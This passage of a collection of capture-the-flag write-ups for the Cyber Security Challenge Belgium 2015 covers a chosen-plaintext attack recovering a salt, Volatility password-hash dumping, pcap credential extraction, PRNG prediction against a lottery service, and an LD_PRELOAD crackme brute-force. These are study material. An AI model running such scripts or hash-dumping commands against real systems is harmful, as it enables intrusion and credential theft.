	# And the encrypted string is the rest. 
	encrypted = data[16:]

	# We don't care about the other blocks.
	return iv, encrypted[:16]

def xor_string(msg, iv):
	res = ""
	for i in range(0, len(msg)):
		k = ord(msg[i]) ^ ord(iv[i])
		res += chr(k)
	return res

def encrypt_directly(prevIV, msg):
	# Calculate the next IV.
	nextIV = updateIV(prevIV)

	# Do an XOR of the message with the IV. The server will XOR again, yielding
	# the original message.
	xored = xor_string(msg, nextIV)

	# Encrypt and return new IV and encrypted data.
	return encrypt(xored)
```

We can't, however, change the fact that the salt will be XOR'ed with the IV and will be encrypted in a garbled state, since it's not part of our input. This means that to build our rainbow table we'll also have to XOR the parts of the salt that we already calculated in order to get a correct hash, and we'll have to XOR it with the IV that we'll be using when we're encrypting the incomplete input. Thus we need a new function to predict far into the future.

```python
def find_iv_after_iterations(iv, amount):
	for i in range(amount):
		iv = updateIV(iv)
	return iv
```

We can now acquire the flag with the following piece of code:

```python
# IV is randomized when first connecting, so we need to get the initial random IV.
# Just encrypt something random to get the IV.
iv, ignore = encrypt("    ")
decoded_flag = ""

# For every character of the flag
for flag_length in range(8):
	# Initialize a rainbow table
	rainbow = {}

	# Create a padding string leaving space for the characters we already figured out
	# and for the one we are going to be guessing now.
	padding = 'a' * (16 - flag_length - 1)

	# We're going to be doing 256 requests to build our rainbow table
	# The request where we actually send a character less and pull one character
	# out of the salt will be the 257'th, so calculate the IV for that iteration.
	next_query_iv = find_iv_after_iterations(iv, 257)

	# For every possible value of the next character
	# Note: you really only need to iterate on the characters that are potentially
	# in the flag here. We're just checking every ASCII code for simplicity's sake.
	for j in range(256):
		# Send a guess to obtain the hash for that guess.
		# XOR the input with the IV to be used when checking in our table.
		# The padding gets XOR'ed as well, but we don't care, it's just padding.
		rainbow_preparation = xor_string(padding + decoded_flag + chr(j), next_query_iv)

		# Send the prepared string directly into the AES encryptor.
		# Store the IV for the next iteration.
		iv, encrypted = encrypt_directly(iv, rainbow_preparation)

		# Store in our rainbow table.
		rainbow[encrypted] = chr(j)

	# By now we should have next_query_iv as the next iv.
	# We send only padding, and let the server add a part of the salt.
	# We don't use encrypt_directly here, because we also XOR'ed the padding
	# when building the rainbow table.
	iv, encrypted = encrypt(padding)
	decoded_flag = decoded_flag + rainbow[encrypted]

# Full calculated flag
print "Decoded flag: ", decoded_flag
```

This code will do 8 iterations, collecting 1 more letter of the flag in every iteration. At the end we print the flag to STDOUT.
The flag we obtain this way is `saltmine`.

## Other write-ups and resources

* <https://ruben.infogroep.be/?p=12>
* <http://blog.nviso.be/2015/04/cyber-security-challenge-belgium-2015_20.html>
# Cyber Security Challenge 2015: Data Extraction

**Category:** Digital Forensics
**Points:** 80
**Description:**

> We messed up and contacted the wrong forensic department. They say they found data, but we can’t really make anything out of it. Can you?

## Write-up

For once, it payed off if you were paying attention in your highschool biology classes. When you learned about the birds and the bees, you also learned about DNA and RNA. That's exactly what this is.

![DNA](images/dnarna.gif)
( Taken from http://www.sophia.org/tutorials/video-material-10-dna-rna )

So let's convert the image to the corresponding DNA (or RNA) characters:

```python
from PIL import Image
 
im = Image.open("output2.jpg")
print im.format, im.size, im.mode

width = im.size[0]
height = im.size[1]

startX = 9
startY = 14

spacingX = 19
spacingY = 28

""""
# blue = 224 = C
# red = 228 = T
# yellow = 103 = G
# green = 2 = A
"""

# T
def blue(r, g, b):
	return abs(r-5) < 15 and abs(g-161) < 15 and abs(b-225) < 15 

# T
def red(r, g, b):
	return abs(r-237) < 15 and abs(g-28) < 15 and abs(b-34) < 15 
	
# A
def green(r, g, b):
	return abs(r-35) < 15 and abs(g-178) < 15 and abs(b-73) < 15
# C	 
def yellow(r, g, b):
	return abs(r-254) < 15 and abs(g-240) < 15 and abs(b-11) < 15 
 
sol = ""
y = startY
while y < height:
	x = startX
	while x < width:
		r, g, b = im.getpixel((x, y))
		print r, g, b
	
		if blue(r, g, b):
			sol += "C"
		if red(r, g, b):
			sol += "U"
		if green(r, g, b):
			sol += "A"
		if yellow(r, g, b):
			sol += "G"
           
		
		x += spacingX
	y += spacingY
	
print sol
```
Which gives us:
```
GACAUUUAAUGGGGUCAAUCUAUGUUCUCGGGAAUAGAAGAGCACUUCAGCGGGACUCUUUUAGACCCACGAGUAGCCGGCAAGCAGCUAGAUAAGCUAGUAGAUGGAGACCGCACCGCACUAUAGCAUAUGCUAGCUUAUAGGUCACACCUAUGAGGCAAGGAGCUAGUAGUAUAUCACCUCACUUCGCUGGGGGUGGUUUUAGUAUUGCCAUUUCCCAUACCGUAUGUGAAGACGUCGAGACAUUCCAUGGGCGUUUUAAGGCGCGGCGUUCUCUCCGCCCUGGUUCACGGGAUUCUGUCGAGAUUGCCGUUUAAAAAGAUUGUCUUGCUCACUUUGGCUCUUUCAGUCCGGCGCUUAAGCGCCUUGCAUAAACUUCGUAGCGCAGGUUUUGCGGCGAUGGCCAACCCAGGAUACCGCUGUUCAACAUUUGUCAGAUCCUCAUGUGACGGGACACCCAAAGCAGGAUGGCGCGCUGUCUCUCAGUAUAUAGAUUUAGUUUUAGUGUGAAGUGCACGCGGCCUAGAGCGGUCACGUCAUGUAUUAGAUCGUAUUGUAGUAACAUCUACCAGCUGCGACUUUUGAACCCGGAGGAGUCCAGGCAACGUAAAAGUAUGGCGUACCACGCGACCAAAUCCCUCAUCUUACGUGUACGAAGGAAGAUACCGCAUUUUAUCGCUUAUCACUAACGCGAGCGUCUAAGCGAACAUUACUAUCCUCUAUAAAAGUUAUACGUGGCUGCUACGGUGACGUAAAGCUUUCUGUUUAAAUGCGCGCCUAAUUCCUUACUGCUAUAACAUACAUCCACCCUACCUGCCACAGUUUCCUACGACCUGGAGAAAAAUUUAAAUGGCCGAUGAUGUGUCGCCACAUACGUGAGCUGAUAGCGGAAGUGUAAA
```
When your cells process the DNA strip, triplets are converted to Amino Acids. This is done using the following chart:

![DNA](images/amino.png)
( Taken from http://biobook.nerinxhs.org/bb/genetics/dna.htm )

We can do this ourselves (which I did the first time), but we can also use the power of the internet:
http://web.expasy.org/translate/

Which gives the following output:
```
5'3' Frame 1
DI-WGQSMFSGIEEHFSGTLLDPRVAGKQLDKLVDGDRTAL-HMLAYRSHL-GKELVVYH
LTSLGVVLVLPFPIPYVKTSRHSMGVLRRGVLSALVHGILSRLPFKKIVLLTLALSVRRL
SALHKLRSAGFAAMANPGYRCSTFVRSSCDGTPKAGWRAVSQYIDLVLV-SARGLERSRH
VLDRIVVTSTSCDF-TRRSPGNVKVWRTTRPNPSSYVYEGRYRILSLITNASV-ANITIL
YKSYTWLLR-RKAFCLNARLIPYCYNIHPPYLPQFPTTWRKI-MADDVSPHT-ADSGSV
5'3' Frame 2
TFNGVNLCSRE-KSTSAGLF-THE-PASS-IS--METAPHYSIC-LIGHTYEARS--YIT
SLRWGWF-YCHFPYRM-RRRDIPWAF-GAAFSPPWFTGFCRDCRLKRLSCSLWLFQSGA-
APCINFVAQVLRRWPTQDTAVQHLSDPHVTGHPKQDGALSLSI-I-F-CEVHAA-SGHVM
Y-IVL--HLPAATFEPGGVQAT-KYGVPRDQIPHLTCTKEDTAFYRLSLTRASKRTLLSS
IKVIRGCYGDVKLSV-MRA-FLTAITYIHPTCHSFLRPGEKFKWPMMCRHIRELIAEV-
5'3' Frame 3
HLMGSIYVLGNRRALQRDSFRPTSSRQAAR-ASRWRPHRTIAYASL-VTPMRQGASSISP
HFAGGGFSIAISHTVCEDVETFHGRFKARRSLRPGSRDSVEIAV-KDCLAHFGSFSPALK
RLA-TS-RRFCGDGQPRIPLFNICQILM-RDTQSRMARCLSVYRFSFSVKCTRPRAVTSC
IRSYCSNIYQLRLLNPEESRQRKSMAYHATKSLILRVRRKIPHFIAYH-RERLSEHYYPL
-KLYVAATVT-SFLFKCAPNSLLL-HTSTLPATVSYDLEKNLNGR-CVATYVS--RKCK
```
If you look clearly, you can see the password, which is "METAPHYSIC LIGHTYEARS". This website also solved the final hurdle: You don't have to start decoding at the first character, but at the second.

Pass: `METAPHYSIC LIGHTYEARS`

## Other write-ups and resources

* <http://blog.nviso.be/2015/04/cyber-security-challenge-belgium-2015_15.html>
# Cyber Security Challenge 2015: Espionage

**Category:** Digital Forensics
**Points:** 80
**Description:**

> We suspect one of our employees is selling secrets to the competitor. We haven’t caught him red handed yet, but we did manage to sniff some traffic. Can you find out what happened?
>
> [`pcap_sniffed_updated`](pcap_sniffed_updated)

## Write-up

This wireshark capture contained an e-mail with a wav file attached.
When inserting the wav file in a spectrum analyzer, you could see a picture of batman.

So the flag is _batman_

## Other write-ups and resources

* [`Cyber Security Challenge 2015: Espionage by Glenn Vandamme`](http://glennvandam.me/2015/03/cyber-security-challenge-2015-espionage/)

# Cyber Security Challenge 2015: Four Eyes

**Category:** Digital Forensics
**Points:** 15
**Description:**

> You are a member of a covert agency that is spying on one of their intelligence targets. They have managed to MiTM (Man-in-The-Middle) one of the target employees and are monitoring his HTTP traffic. It is of vital importance that you extract the correct password he submitted to www.2dehands.be.
>
> [`password.pcap`](password.pcap)

## Write-up

Let’s open up [`password.pcap`](password.pcap) in Wireshark, and look for `www.2dehands.be` traffic by entering the filter `http.host eq www.2dehands.be`. This reveals a few HTTP requests including a single POST request containing the login credentials:

![](wireshark.png)

The password is `safefromNSA`.

## Other write-ups and resources

* none yet
# Cyber Security Challenge 2015: Passwords

**Category:** Digital Forensics
**Points:** 30
**Description:**

> The forensic department received a memory dump from a computer. The goal is to obtain the passwords for all users. What is the password for the standard user account?
>
> File download link: <http://we.tl/AMKxMDamz3>

## Write-up

Let’s use [Volatility](https://github.com/volatilityfoundation/volatility) and start by identifying the operating system profile:

```bash
$ vol.py -f memdump_password.mem imageinfo
Volatility Foundation Volatility Framework 2.4
Determining profile based on KDBG search...

          Suggested Profile(s) : Win2008R2SP0x64, Win7SP1x64, Win7SP0x64, Win2008R2SP1x64
                     AS Layer1 : AMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (/tmp/memdump_password.mem)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf80002c0c0a0
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff80002c0dd00L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2015-02-16 08:05:50 UTC+0000
     Image local date and time : 2015-02-16 09:05:50 +0100
```

We should use one of the suggested profiles to analyze the memory dump. Let’s use `--profile=Win7SP1x64` and print the list of registry hives, to figure out the starting location in memory where the registry info resides:.

```bash
$ vol.py -f memdump_password.mem --profile=Win7SP1x64 hivelist
Virtual            Physical           Name
------------------ ------------------ ----
0xfffff8a002692010 0x000000007804e010 \??\C:\Users\user01\ntuser.dat
0xfffff8a003b7c410 0x0000000019b7f410 \??\C:\Windows\System32\config\COMPONENTS
0xfffff8a004211010 0x000000006ff00010 \SystemRoot\System32\Config\DEFAULT
0xfffff8a006780010 0x00000000188aa010 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT
0xfffff8a00000f010 0x000000002d547010 [no name]
0xfffff8a00002e010 0x000000002d65c010 \REGISTRY\MACHINE\SYSTEM
0xfffff8a000065010 0x000000002d693010 \REGISTRY\MACHINE\HARDWARE
0xfffff8a000f30010 0x0000000027586010 \SystemRoot\System32\Config\SOFTWARE
0xfffff8a000fe6410 0x0000000027079410 \Device\HarddiskVolume1\Boot\BCD
0xfffff8a001ea5010 0x0000000014b27010 \SystemRoot\System32\Config\SECURITY
0xfffff8a001f16010 0x000000001765d010 \SystemRoot\System32\Config\SAM
0xfffff8a002096010 0x00000000186b7010 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT
0xfffff8a00246e010 0x0000000005f61010 \??\C:\System Volume Information\Syscache.hve
0xfffff8a002617010 0x00000000065e0010 \??\C:\Users\user01\AppData\Local\Microsoft\Windows\UsrClass.dat
```

The virtual address corresponding to `SYSTEM` is `0xfffff8a00002e010`, and the address corresponding to `SAM` is `0xfffff8a001f16010`. With this information we can dump the LM/NTLM password hashes from memory:

```bash
$ vol.py -f memdump_password.mem --profile=Win7SP1x64 hashdump -y 0xfffff8a00002e010 -s 0xfffff8a001f16010
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
user01:1000:aad3b435b51404eeaad3b435b51404ee:f9e37e83b83c47a93c2f09f66408631b:::
```

A quick Google search reveals that `f9e37e83b83c47a93c2f09f66408631b` is the NTLM hash of `abc123`. That’s the password we were looking for!

## Other write-ups and resources

* [Memory forensics: how to pull passwords from a memory dump](http://articles.forensicfocus.com/2014/04/28/windows-logon-password-get-windows-logon-password-using-wdigest-in-memory-dump/)
# Cyber Security Challenge 2015: Wardriving

**Category:** Digital Forensics
**Points:** 15
**Description:**

> You managed to perform a MiTM (Man-in-The-Middle) attack on a wifi network while wardriving. You know that one of the residents here uses one password for all his/her accounts, including online games. Find the password that he/she used on Tribal Wars.
>
> [`online_game.pcap`](online_game.pcap)

## Write-up

Let’s open [`online_game.pcap`](online_game.pcap) in Wireshark, and look for Tribal Wars traffic by entering the filter `http.host contains tribalwars`. This reveals a `POST` request (frame 6641) containing the login credentials. The username is `Falken` and the password is `Joshua` — another [WarGames](https://en.wikipedia.org/wiki/WarGames) reference!

## Other write-ups and resources

* none yet
# Cyber Security Challenge 2015: Advanced Persistent Threats

**Category:** General Security Knowledge
**Points:** 5
**Description:**

> What is the name of the worm that was used to attack a famous Belgian cryptographer?

## Write-up

The answer is [Regin](http://www.pcworld.com/article/2852012/regin-malware-linked-to-attacks-on-belgacom-wellknown-cryptographer.html).

## Other write-ups and resources

* none yet
# Cyber Security Challenge 2015: Cryptographic Algorithms

**Category:** General Security Knowledge
**Points:** 5
**Description:**

> What is the name of the cipher on which the AES specification is based?

## Write-up

The answer is [Rijndael](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard).

## Other write-ups and resources

* none yet
# Cyber Security Challenge 2015: Hacker Movies

**Category:** General Security Knowledge
**Points:** 5
**Description:**

> What is the name of a hacker movie from 1983 in which a young man finds a backdoor into a military central computer in which reality is confused with game-playing, possibly starting World War III?

## Write-up

The answer is [WarGames](http://www.imdb.com/title/tt0086567/).

## Other write-ups and resources

* none yet
# Cyber Security Challenge 2015: Hiding Information

**Category:** General Security Knowledge
**Points:** 5
**Description:**

> What is the name of the art or practice of concealing a message, image, or file within another message, image, or file?

## Write-up

The answer is [steganography](https://en.wikipedia.org/wiki/Steganography).

## Other write-ups and resources

* none yet
# Cyber Security Challenge 2015: Malware Categories

**Category:** General Security Knowledge
**Points:** 5
**Description:**

> What is the well known name for the type of malware the restricts access to the computer system that it infects and demands a fee to remove this restriction?

## Write-up

The answer is [ransomware](https://en.wikipedia.org/wiki/Ransomware).

## Other write-ups and resources

* none yet
# Cyber Security Challenge 2015: No Such Agency

**Category:** General Security Knowledge
**Points:** 5
**Description:**

> What’s the NSA’s synonym for a type of malware that hides the presence of certain programs or processes from the kernel?

## Write-up

The correct solution is _implant_.

## Other write-ups and resources

* none yet
# Cyber Security Challenge 2015: Security Conferences

**Category:** General Security Knowledge
**Points:** 5
**Description:**

> What is the name of one of the biggest hacking conferences in the world? The 22th edition of this conference was in August 2014 in Las Vegas.

## Write-up

The answer is [DEF CON](https://www.defcon.org/).

## Other write-ups and resources

* none yet
# Cyber Security Challenge 2015: Security History

**Category:** General Security Knowledge
**Points:** 5
**Description:**

> What is the last name of the British mathematician, logician, cryptanalyst, philosopher and computer scientist who concentrated on cryptanalysis of the Enigma during WWII?

## Write-up

The answer is [Turing](https://en.wikipedia.org/wiki/Alan_Turing).

## Other write-ups and resources

* none yet
# Cyber Security Challenge 2015: Security History v2

**Category:** General Security Knowledge
**Points:** 5
**Description:**

> Last name of a German civil engineer, inventor and computer pioneer. His greatest achievement was the world’s first programmable computer in May 1941.

## Write-up

The answer is [Zuse](https://en.wikipedia.org/wiki/Konrad_Zuse).

## Other write-ups and resources

* none yet
# Cyber Security Challenge 2015: Security Organizations

**Category:** General Security Knowledge
**Points:** 5
**Description:**

> A worldwide not-for-profit charitable organization focused on improving the security of software. Their mission is to make software security visible, so that individuals and organizations worldwide can make informed decisions about true software security risks. What is the acronym of this organisation?

## Write-up

The answer is [OWASP](https://www.owasp.org/).

## Other write-ups and resources

* none yet
# Cyber Security Challenge 2015: Security Software

**Category:** General Security Knowledge
**Points:** 5
**Description:**

> What is the name of the project designed to protect your privacy & defend against surveillance?

## Write-up

The answer is [Tor](https://www.torproject.org/).

## Other write-ups and resources

* none yet
# Cyber Security Challenge 2015: Security Terminology

**Category:** General Security Knowledge
**Points:** 5
**Description:**

> What is the acronym for the attack where an attempt to make a machine or network resource unavailable to its intended users is performed in a distributed way?

## Write-up

The answer is [DDoS](https://en.wikipedia.org/wiki/Denial-of-service_attack).

## Other write-ups and resources

* none yet
# Cyber Security Challenge 2015: Security Terminology v2

**Category:** General Security Knowledge
**Points:** 5
**Description:**

> A trap set to detect, deflect, or, in some manner, counteract attempts at unauthorized use of information systems. Generally consists of a computer, data, or a network site that appears to be part of a network, but is actually isolated and monitored, and which seems to contain information or a resource of value to attackers. What is the name of this type of trap?

## Write-up

This is called a [`honeypot`](https://en.wikipedia.org/wiki/Honeypot_%28computing%29).

## Other write-ups and resources

* none yet
# Cyber Security Challenge 2015: Software Vulnerabilities v1

**Category:** General Security Knowledge
**Points:** 5
**Description:**

> What is the name of the serious vulnerability in the popular OpenSSL cryptographic software library that cause a lot of uproar in the security industry?

## Write-up

The answer is [Heartbleed](http://heartbleed.com/).

## Other write-ups and resources

* none yet
# Cyber Security Challenge 2015: Nviso Vault

**Category:** Mobile Application Security
**Points:** 50
**Description:**

> One of our programmers made a Vault that is used to store sensitive information. He says it’s safe, but come on, the application *must* be leaking information somewhere… right?
>
> [`NvisoVault.apk`](NvisoVault.apk)

## Write-up

First, create an emulator (like Google's AVD or Genymotion) and install the application.
```
ComputerJ:NvisoVault jbeckers$ adb install -r NvisoVault.apk 
7869 KB/s (109363 bytes in 0.013s)
	pkg: /data/local/tmp/NvisoVault.apk
Success
ComputerJ:NvisoVault jbeckers$ 
```
When we launch the application, it counts down from 10 and displays a bunch of random symbols.

The easiest way to solve this challenge is to run strace on the application. In order for strace to work, you need to know the PID, so let's get that first:
```
ComputerJ:NvisoVault jbeckers$ adb shell
root@vbox86p:/ # ps | grep vault                                               
u0_a59    2568  1240  579356 39396 ffffffff b76cc07b S be.nviso.nvisovault
```
Next, we have to attach strace. Note that this has to be done within the first 10 seconds of starting up the application, or else you'll be too late.

```
root@vbox86p:/ # ps | grep vault                                               
u0_a59    2605  1240  575216 36544 ffffffff b76cba23 S be.nviso.nvisovault
root@vbox86p:/ # strace -p 2605
Process 2605 attached - interrupt to quit
clock_gettime(CLOCK_MONOTONIC, {1735, 201662416}) = 0
...
access("Decoding data with password ?\200\230I_love_panda_bears?\200\231", F_OK) = -1 ENOENT (No such file or directory)
...
```
Which is the flag: `I_love_panda_bears`

## Other write-ups and resources

* none yet
# Cyber Security Challenge 2015: Reverse That App

**Category:** Mobile Application Security
**Points:** 20
**Description:**

> We have intercepted a malicious Android binary, and we need your help analyzing the application! Reports from the wild say that this piece of malware is sending text messages to a premium number, resulting in a huge phone bill for the victims! This needs to stop… Can you identify the mobile number of the attacker so we can track him down? Answer in this format: `+XX XXX XXX XXX`
>
> [`Kbank.apk`](Kbank.apk)

## Write-up

After decompiling [`Kbank.apk`](Kbank.apk) you can find the the answer in the following class: ```src\com\fake\site\sms\sms.java```. The following variable contains the solution:

```java
public static final String NUMBER = "+79163525068";
``` 

## Other write-ups and resources

* none
# Cyber Security Challenge 2015: Lottery

**Category:** Network Security
**Points:** 50
**Description:**

> Come and throw away your money at the NViso Lottery!
>
> 37.187.249.84:10004

## Write-up

Let's connect to the lottery service:
```
root@kali:~# nc localhost 55567
################################################################################
Welcome to the NVISO lottery!
You start out with $100.
Each bet will cost you $10.
Guess the correct number, and you'll win $75!
Each number is chosen at random from the range [0, 1000].
If you feel you've been cheated, you can use the ticket ID to get feedback

Earn more than $1337 and get a special prize!
################################################################################

Want to play another round?
Current money: $100
1. Yes
2. No

1
Good luck! (id #KEkxCihJMTg4MDkKSTg0MDIKSTIwNjUzCnRwMQpOdC4=)
Please enter a number between 0 and 1000:
100
Too bad, the answer was 729

Want to play another round?
Current money: $90
1. Yes
2. No

2
Oh.. okay then. Bye!
```
The ID is base64 encoded. Decoding it gives the following:
```python
>>> from base64 import b64decode
>>> b64decode("KEkxCihJMTg4MDkKSTg0MDIKSTIwNjUzCnRwMQpOdC4=")
'(I1\n(I18809\nI8402\nI20653\ntp1\nNt.'
>>>
```
This looks like python's Pickle format:
```python
>>> import pickle
>>> s = b64decode("KEkxCihJMTg4MDkKSTg0MDIKSTIwNjUzCnRwMQpOdC4=")
>>> pickle.loads(s)
(1, (18809, 8402, 20653), None)
>>>
```
This gives us the seed for a random number generator. It's not large enough to be used as the seed for the default python random number generator (MersenneTwiter), but it is the correct format for python's previous default random number generator: Wichmann-Hill.
```python
from cPickle import *
from random import WichmannHill
from base64 import b64decode

input = "KEkxCihJMTg4MDkKSTg0MDIKSTIwNjUzCnRwMQpOdC4="
r = WichmannHill()
print r.getstate()

newState = loads(b64decode(input))
r.setstate(newState)
print r.randrange(0, 1000)
```
This gives `729`, which is exactly what we were looking for.

Quick little solution:
```python
import cPickle as pickle
from random import WichmannHill
import base64
from pwn import *

r = remote('localhost', 55567);

while True:
	d = r.recvuntil("2. No")
	
	if "your prize" in d:
		print d
		break
	
	while r.can_recv():
		r.recvline()
		
	r.sendline("1")
	data = r.recvline()
	print data
	data = data[16:len(data)-2]
	data = base64.b64decode(data)
	
	seed = pickle.loads(data)
	
	prng = WichmannHill()
	prng.setstate(seed)
	
	while r.can_recv():
		r.recvline()

	nr = prng.randrange(0, 1000)
	print "> ", str(nr)
	r.sendline(str(nr))
	print r.recvline()
```

## Other write-ups and resources

* <http://blog.nviso.be/2015/05/cyber-security-challenge-belgium-2015.html>
# Cyber Security Challenge 2015: SFTP

**Category:** Network Security
**Points:** 50
**Description:**

> One of our employees uses an SFTP server to store sensitive company files. He ensured us it’s safe. I mean… Why wouldn’t SFTP be safe?
>
> 37.187.249.84:10003 (login with Kermit:MissPiggy)

## Write-up

Contrary to what one would expect at first sight, this SFTP server isn't a secure file server. The acronym 'SFTP' can also be used to denote the [Simple File Transfer Protocol](https://en.wikipedia.org/wiki/Simple_File_Transfer_Protocol).

In order to connect to the server, simply fire up netcat and connect to the server at the given port.

```bash
$ nc 37.187.249.84 20003
+NVISO SFTP server
```

Now, let's take a look at some of the commands we can use on this server. The most comprehensive documentation on the simple file transfer protocol can be found on its [rfc page](https://tools.ietf.org/html/rfc913).

Log in using the given credentials:

```
USER Kermit
+ Kermit ok
PASS MissPiggy
! Welcome Kermit
```

List directory contents:

```
LIST V
+.
drwxr-xr-x   2 Kermit  Kermit     68 Feb 19 14:42 documents
LIST F
+.
documents/
```

Change to another directory:

```
CDIR documents
! directory changed to documents
LIST V
+documents
-rw-r--r--@  1 Kermit  Kermit   201892 Feb 19 14:58 flag
```

It looks like we have found our flag. Now let's set the transmission mode to 'binary' (the only mode supported by the server) and pull the file in:

```
TYPE B
+ Using Binary mode
RETR flag
99204
SEND
```

Capture the output of the SEND command into a file (I used `tee` for this).

Now we can examine what type of file the flag is, using the old and trusty `file`

```bash
$ file out.raw
out: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, baseline, precision 8, 550x450, frames 3
```

So, let's open the image up: `xdg-open out.raw`

When you looks closely (this depends on monitor and color configuration), you can see the text 'KermitLovesBacon' in the top right corner. This is the flag:

![](out.jpg)

## Other write-ups and resources

* <http://blog.nviso.be/2015/04/cyber-security-challenge-belgium-2015.html>
# Cyber Security Challenge 2015 write-ups

* <https://www.cybersecuritychallenge.be/>
* [Scoreboard](https://www.cybersecuritychallenge.be/scoreboard)

## Completed write-ups

* [cryptography/crack-the-hash](cryptography/crack-the-hash)
* [cryptography/guess-the-algorithm](cryptography/guess-the-algorithm)
* [cryptography/one-way](cryptography/one-way)
* [digital-forensics/data-extraction](digital-forensics/data-extraction)
* [digital-forensics/espionage](digital-forensics/espionage)
* [digital-forensics/four-eyes](digital-forensics/four-eyes)
* [digital-forensics/passwords](digital-forensics/passwords)
* [digital-forensics/wardriving](digital-forensics/wardriving)
* [general-security-knowledge/advanced-persistent-threats](general-security-knowledge/advanced-persistent-threats)
* [general-security-knowledge/cryptographic-algorithms](general-security-knowledge/cryptographic-algorithms)
* [general-security-knowledge/hacker-movies](general-security-knowledge/hacker-movies)
* [general-security-knowledge/hiding-information](general-security-knowledge/hiding-information)
* [general-security-knowledge/malware-categories](general-security-knowledge/malware-categories)
* [general-security-knowledge/no-such-agency](general-security-knowledge/no-such-agency)
* [general-security-knowledge/security-conferences](general-security-knowledge/security-conferences)
* [general-security-knowledge/security-history](general-security-knowledge/security-history)
* [general-security-knowledge/security-history-v2](general-security-knowledge/security-history-v2)
* [general-security-knowledge/security-organizations](general-security-knowledge/security-organizations)
* [general-security-knowledge/security-software](general-security-knowledge/security-software)
* [general-security-knowledge/security-terminology](general-security-knowledge/security-terminology)
* [general-security-knowledge/security-terminology-v2](general-security-knowledge/security-terminology-v2)
* [general-security-knowledge/software-vulnerabilities-v1](general-security-knowledge/software-vulnerabilities-v1)
* [mobile-application-security/nviso-vault](mobile-application-security/nviso-vault)
* [mobile-application-security/reverse-that-app](mobile-application-security/reverse-that-app)
* [network-security/lottery](network-security/lottery)
* [network-security/sftp](network-security/sftp)
* [reverse-engineering/crackme](reverse-engineering/crackme)
* [reverse-engineering/reverse-that-binary](reverse-engineering/reverse-that-binary)
* [secure-coding/automated-analysis-mistakes](secure-coding/automated-analysis-mistakes)
* [secure-coding/owasp](secure-coding/owasp)
* [secure-coding/static-analysis](secure-coding/static-analysis)
* [web-application-security/nsa](web-application-security/nsa)
* [web-application-security/nviso-file-host](web-application-security/nviso-file-host)

## External write-ups only

* none yet

## Missing write-ups

* [web-application-security/0day-hunting](web-application-security/0day-hunting)# Cyber Security Challenge 2015: Crackme

**Category:** Reverse Engineering
**Points:** 120
**Description:**

> We found this binary, but we lost the password. Please retrieve it for us.
>
> [`Crackme`](Crackme)

## Write-up

_By haxelion on <http://haxelion.eu/writeup/Crackme_In_Memory_Bruteforce/>_._

As with any crackme, you have to provide a password in order to obtain the flag. If you start reverse engineering the crackme you will quickly understand that the password checking function is far from trivial and that the flag is generated from that password. The only way to obtain the flag is to reverse the password checking algorithm.

Instead of spending a lot of precious time on reversing all that assembly code, I decided to try instrumentation based techniques. Unfortunately, instruction counting using intel Pin and breakpoint counting using `gdb` both failed because of the algorithm specifics. So we have to learn more about that algorithm.

Here is what the password checking algorithm does:

* the main function (`0x400809`) only accepts 20 characters long passwords
* each character of the password is split in individual bits to form a 160
integers array of `0`’s and `1`’s (functions `0x40074a` and `0x4006bd`)
* a loop (`0x400924`) loads 12 different ranges of different sizes of the integer array in a single integer by reassembling the bits (function `0x4007ac`)
* those 12 integers are checked by 11 (one is used twice) different functions
through a call table (function `0x4009f0`)
* each of those functions is different and non-trivial (some of them even use
`sprintf`…)

The instruction counting and breakpoint counting could not work because the checksum ranges are not byte aligned and sometimes cover more than 4 characters. Thus any guided bruteforce of the password would have been slow
and tricky to implement.

But I still did not want to reverse those checksum functions.

What if we could bruteforce those checksum functions directly? We would obtain the correct values and could then reassemble the bit array and obtain the password. The biggest range is 31 bits long which should not take long to
bruteforce.

What is the easiest way to instrument those functions for the bruteforce? An old time reverser best friend: `LD_PRELOAD` of course. Our code will be loaded with the crackme and we can bruteforce those checksum functions
in the init function of our preloaded library.

```c
#include <stdio.h>

// Function pointer of the check functions
unsigned int (*f[]) (unsigned int) = {0x400aaf, 0x400ae1, 0x400b2d, 0x400c21,
                                   0x400ca3, 0x400cb6, 0x400ce2, 0x400e53,
                                   0x400d07, 0x400d2c, 0x400dc1, 0x400cb6};

// The number of bits checked by each function
int bits[] = {4,7,24,31,4,10,15,7,12,27,13,6};

// Declare an init function for our preloaded library
void __attribute__((constructor)) init()
{
    unsigned int i, j;
    for(i = 0; i < 12; i++)
    {
        // compute the maximum value for the bruteforce of each function
        unsigned int limit = 1 << (bits[i]);
        printf("Bruteforcing sub_%x (limit = %u): \n", f[i], limit);
        for(j = 0; j < limit; j++)
        {
            // Call the function and check the output
            if(f[i](j) == 1)
            {
                printf("%u\n", j);
            }
        }
    }
}
```

```bash
$ gcc -o bruteforce.so -shared -fpic bruteforce.c
// Lots of GCC warnings reminding us of how dirty this is

$ LD_PRELOAD=./bruteforce.so ./Crackme
Bruteforcing sub_400aaf (limit = 16):
10
Bruteforcing sub_400ae1 (limit = 128):
103
Bruteforcing sub_400b2d (limit = 16777216):
805098
Bruteforcing sub_400c21 (limit = 2147483648):
0
13
3341
150797
12995853
717638925
1791380749
Bruteforcing sub_400ca3 (limit = 16):
9
Bruteforcing sub_400cb6 (limit = 1024):
0
1
5
21
85
341
Bruteforcing sub_400ce2 (limit = 32768):
24903
Bruteforcing sub_400e53 (limit = 128):
96
Bruteforcing sub_400d07 (limit = 4096):
3336
Bruteforcing sub_400d2c (limit = 134217728):
0
94148244
Bruteforcing sub_400dc1 (limit = 8192):
882
Bruteforcing sub_400cb6 (limit = 64):
0
1
5
21
```

As we can see, more than one values are validated by some checksum functions. However, because the result needs to be a printable password, the largest
values are a safe bet. We can now reassemble the bits and obtain the flag.

```python
#!/usr/bin/python2

# Value obtained from the in memory bruteforce
v = [10,103,805098, 1791380749, 9, 341,  24903, 96,3336, 94148244, 882, 21]
# Number of bit each value should be coded on
